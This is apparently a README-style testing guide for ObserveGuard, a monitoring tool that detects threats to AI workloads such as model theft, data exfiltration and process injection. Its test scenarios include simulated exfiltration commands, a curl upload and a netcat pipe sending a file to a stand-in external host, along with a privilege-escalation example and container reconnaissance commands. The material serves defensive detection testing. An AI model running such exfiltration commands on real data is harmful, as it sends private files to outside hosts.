# 🛡️ ObserveGuard Security Testing Guide

This guide explains what security threats ObserveGuard detects and how to test them comprehensively.

## 🎯 Security Threats Detected

### 1. **AI-Specific Threats**

#### **Model Extraction/Theft** 🔓
- **Description**: Unauthorized access or copying of AI model files
- **Detection Mechanisms**:
  - Non-AI processes accessing `.pt`, `.pth`, `.pb`, `.onnx`, `.h5` files
  - Large file reads from model directories (`/models`, `/checkpoints`, `/weights`)
  - Unusual network transfers of large files from AI processes (>50MB)
  - Model file enumeration patterns

#### **Data Exfiltration** 📤
- **Description**: Unauthorized transfer of sensitive training data or model outputs
- **Detection Mechanisms**:
  - Large data uploads to external networks (>10MB)
  - AI processes making unexpected external network connections
  - Bulk file access patterns from ML workloads
  - Suspicious data serialization activities

#### **AI Runtime Compromise** ⚡
- **Description**: Compromise of AI runtime environments
- **Detection Mechanisms**:
  - AI processes spawning unexpected child processes
  - Privilege escalation attempts from ML workloads
  - Code injection into running AI processes
  - Container breakout attempts

#### **Prompt Injection & Adversarial Attacks** 🎭
- **Description**: Malicious inputs designed to manipulate AI behavior
- **Detection Mechanisms**:
  - Suspicious input patterns to AI models
  - Rate limiting violations on inference endpoints
  - Anomalous model behavior patterns
  - Adversarial input detection

### 2. **General Security Threats**

#### **Network-Based Attacks** 🌐
- **Command & Control (C2) Communications**
- **Data Exfiltration via Network**
- **Suspicious DNS Queries**
- **Port Scanning and Reconnaissance**

#### **Process-Based Attacks** 🔄
- **Process Injection**
- **Privilege Escalation**
- **Living-off-the-Land Techniques**
- **Malicious Process Spawning**

#### **File System Attacks** 📁
- **Credential Harvesting**
- **Configuration Tampering**
- **Sensitive Data Access**
- **File Permission Escalation**

## 🧪 How to Test Security Detection

### **Quick Test Suite**

1. **Start ObserveGuard Server**:
   ```bash
   ./build/observeguard server --config configs/apiserver.yaml
   ```

2. **Run Security Test Suite**:
   ```bash
   python test_security.py
   ```

3. **Real-time WebSocket Testing**:
   ```bash
   python test_websocket.py
   ```

### **Manual Testing Scenarios**

#### **Test 1: Model Extraction Simulation** 🎯

```bash
# Start data collection
./build/observeguard collect --duration 30s &

# Create fake model files
mkdir test_models
dd if=/dev/zero of=test_models/bert-large.pt bs=1M count=50  # 50MB model
dd if=/dev/zero of=test_models/resnet50.onnx bs=1M count=25  # 25MB model

# Simulate unauthorized access (from non-AI process)
cat test_models/bert-large.pt > /dev/null
cp test_models/resnet50.onnx /tmp/stolen_model.onnx

# Check for detections
curl http://localhost:8080/api/v1/threats
curl http://localhost:8080/api/v1/events?types=ai_security

# Cleanup
rm -rf test_models /tmp/stolen_model.onnx
```

**Expected Detection**:
- ✅ `model_file_access_external` - Non-AI process accessing model files
- ✅ `large_model_transfer` - Large file operations on model files

#### **Test 2: Data Exfiltration Simulation** 📤

```bash
# Start monitoring
./build/observeguard collect --duration 20s &

# Simulate large data creation and transfer
dd if=/dev/urandom of=sensitive_data.zip bs=1M count=100  # 100MB file

# Simulate network exfiltration attempt
curl -X POST -F "file=@sensitive_data.zip" http://external-server.com/upload
# Or simulate with netcat
# nc external-server.com 4444 < sensitive_data.zip

# Check detections
curl http://localhost:8080/api/v1/threats/stats
curl http://localhost:8080/api/v1/network/connections

# Cleanup
rm sensitive_data.zip
```

**Expected Detection**:
- ✅ `large_data_upload` - Large data transfer to external network
- ✅ `suspicious_network_activity` - Unexpected external connections

#### **Test 3: Process Injection Simulation** 🔄

```bash
# Start monitoring
./build/observeguard collect --duration 15s &

# Simulate AI process spawning suspicious children
python3 -c "
import subprocess
import time
for i in range(5):
    subprocess.Popen(['echo', 'child_process_' + str(i)])
    time.sleep(1)
"

# Simulate privilege escalation attempt
python3 -c "
import subprocess
subprocess.run(['whoami'])  # Harmless command
# In real attack: subprocess.run(['sudo', 'su'])
"

# Check detections
curl http://localhost:8080/api/v1/processes
curl http://localhost:8080/api/v1/threats?category=privilege_escalation
```

**Expected Detection**:
- ✅ `unusual_child_process_spawn` - AI process spawning multiple children
- ✅ `process_hierarchy_anomaly` - Unusual process relationships

#### **Test 4: Real-time WebSocket Monitoring** 📡

```bash
# Terminal 1: Start server
./build/observeguard server --config configs/apiserver.yaml

# Terminal 2: Start real-time monitoring
python3 -c "
import asyncio
import websockets
import json

async def monitor():
    uri = 'ws://localhost:8080/ws/threats'
    async with websockets.connect(uri) as ws:
        while True:
            msg = await ws.recv()
            data = json.loads(msg)
            if data.get('type') == 'threat':
                threat = data['data']
                print(f'🚨 THREAT: {threat[\"severity\"]} - {threat[\"category\"]}')

asyncio.run(monitor())
"

# Terminal 3: Generate suspicious activity
./build/observeguard collect --duration 60s
# While running, perform suspicious activities in Terminal 4
```

#### **Test 5: API-Based Threat Analysis** 🔍

```bash
# Get current threat statistics
curl -s http://localhost:8080/api/v1/threats/stats | jq

# List all detected threats
curl -s http://localhost:8080/api/v1/threats | jq

# Get AI security events
curl -s "http://localhost:8080/api/v1/events?types=ai_security&limit=10" | jq

# Check AI models and runtimes
curl -s http://localhost:8080/api/v1/ai/models | jq
curl -s http://localhost:8080/api/v1/ai/runtimes | jq

# Get system metrics
curl -s http://localhost:8080/api/v1/system/metrics | jq
```

### **Advanced Testing Scenarios**

#### **Kubernetes AI Workload Testing** ☸️

```yaml
# k8s-ai-test.yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: ai-security-test
spec:
  template:
    spec:
      containers:
      - name: ml-workload
        image: python:3.9
        command: ["python3"]
        args: ["-c", "
        import os
        import time
        # Simulate model loading
        with open('/tmp/model.pt', 'wb') as f:
            f.write(b'0' * 50*1024*1024)  # 50MB fake model
        # Simulate inference
        for i in range(100):
            with open('/tmp/model.pt', 'rb') as f:
                f.read(1024)
            time.sleep(1)
        "]
        volumeMounts:
        - name: model-storage
          mountPath: /models
      volumes:
      - name: model-storage
        emptyDir: {}
      restartPolicy: Never
```

#### **Container Breakout Testing** 🐳

```bash
# Run in containerized environment
docker run --rm -it --name ai-test python:3.9 bash

# Inside container, simulate breakout attempts
python3 -c "
import subprocess
import os
# Simulate container escape attempts
subprocess.run(['mount'])
subprocess.run(['cat', '/proc/mounts'])
os.system('ls -la /')
"
```

## 📊 **Expected Detection Results**

### **High-Fidelity Detections**
- ✅ Model file access by unauthorized processes
- ✅ Large file transfers from AI processes
- ✅ Privilege escalation attempts
- ✅ Suspicious network connections
- ✅ Credential harvesting patterns

### **Medium-Fidelity Detections**
- ⚠️ Process spawning anomalies
- ⚠️ File access burst patterns
- ⚠️ Network traffic anomalies
- ⚠️ Resource consumption spikes

### **Low-Fidelity (Learning Mode)**
- 📈 Baseline behavior establishment
- 📈 Normal vs. anomalous patterns
- 📈 User behavior profiling

## 🎛️ **Configuring Detection Sensitivity**

Edit `configs/threat_detection.yaml`:

```yaml
# High sensitivity (more alerts, potential false positives)
thresholds:
  ai_model_access:
    max_accesses_per_minute: 5  # Lower = more sensitive
  data_exfiltration:
    max_upload_size_mb: 10      # Lower = more sensitive

# Medium sensitivity (balanced)
thresholds:
  ai_model_access:
    max_accesses_per_minute: 10
  data_exfiltration:
    max_upload_size_mb: 50

# Low sensitivity (fewer alerts, may miss subtle attacks)
thresholds:
  ai_model_access:
    max_accesses_per_minute: 20
  data_exfiltration:
    max_upload_size_mb: 100
```

## 🔧 **Troubleshooting Detection Issues**

### **No Threats Detected**
1. **Check collector status**: `curl http://localhost:8080/api/v1/monitoring/status`
2. **Verify event generation**: `curl http://localhost:8080/api/v1/events`
3. **Review configuration**: `./build/observeguard config validate`
4. **Check logs**: Look for collector startup messages
5. **Increase sensitivity**: Lower detection thresholds

### **Too Many False Positives**
1. **Add to whitelist**: Update `configs/threat_detection.yaml`
2. **Increase thresholds**: Higher limits = fewer alerts
3. **Refine rules**: Adjust detection logic
4. **Review baselines**: Establish normal behavior patterns

### **Performance Issues**
1. **Reduce collector frequency**: Increase monitoring interval
2. **Limit event types**: Disable unnecessary collectors
3. **Optimize storage**: Use faster storage backend
4. **Scale resources**: More CPU/memory for analysis

## 📈 **Monitoring Detection Effectiveness**

### **Key Metrics to Track**
```bash
# Detection rate
curl http://localhost:8080/api/v1/threats/stats

# Event processing rate
curl http://localhost:8080/api/v1/system/metrics

# False positive rate (manual analysis needed)
curl http://localhost:8080/api/v1/alerts?status=false_positive

# Coverage metrics
curl http://localhost:8080/api/v1/events?types=ai_security
```

### **Performance Benchmarks**
- **Event Processing**: >10,000 events/second
- **Threat Detection**: <100ms response time
- **False Positive Rate**: <5% for well-tuned rules
- **Storage Efficiency**: ~1KB per event average

## 🚀 **Next Steps**

1. **Deploy in Production**: Start with monitoring-only mode
2. **Tune Detection Rules**: Adjust based on your environment
3. **Integrate with SIEM**: Forward alerts to your security platform
4. **Set up Automated Response**: Configure response actions
5. **Regular Testing**: Schedule monthly security testing

---

**Remember**: ObserveGuard provides the detection framework - tune it for your specific AI workloads and threat landscape!